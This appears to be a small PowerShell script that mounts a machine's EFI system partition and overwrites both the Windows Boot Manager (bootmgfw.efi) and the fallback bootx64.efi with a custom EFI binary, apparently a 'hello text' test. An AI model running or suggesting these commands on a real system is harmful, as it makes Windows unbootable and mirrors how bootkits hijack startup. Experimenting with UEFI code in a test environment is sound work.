try {
    Set-Partition -DiskNumber 0 -PartitionNumber 1 -NewDriveLetter Z
}
catch {
    sleep -Milliseconds 500
}

Copy-Item -Path .\boot_hello_text.efi -Destination Z:\EFI\boot\bootx64.efi
Copy-Item -Path .\boot_hello_text.efi -Destination Z:\EFI\Microsoft\Boot\bootmgfw.efi